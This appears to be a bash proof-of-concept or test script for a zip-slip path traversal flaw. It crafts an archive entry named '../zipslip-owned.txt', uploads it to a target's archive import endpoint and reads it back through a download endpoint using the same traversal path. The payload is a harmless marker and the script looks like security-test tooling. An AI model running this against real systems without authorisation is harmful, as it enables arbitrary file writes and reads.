#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
tmp=$(mktemp -d)
trap 'rm -rf "$tmp" "$JAR"' EXIT
python3 - "$tmp/poc.zip" <<'PYZ'
import sys,zipfile
with zipfile.ZipFile(sys.argv[1], 'w') as z:
    z.writestr('../zipslip-owned.txt', 'GO-ZIPSLIP-OWNED')
PYZ
curl -s -X POST "$TARGET/api/import/archive" -F "file=@$tmp/poc.zip" >/dev/null
curl -sG "$TARGET/api/attachments/download" --data-urlencode 'name=../zipslip-owned.txt' | grep -q 'GO-ZIPSLIP-OWNED'
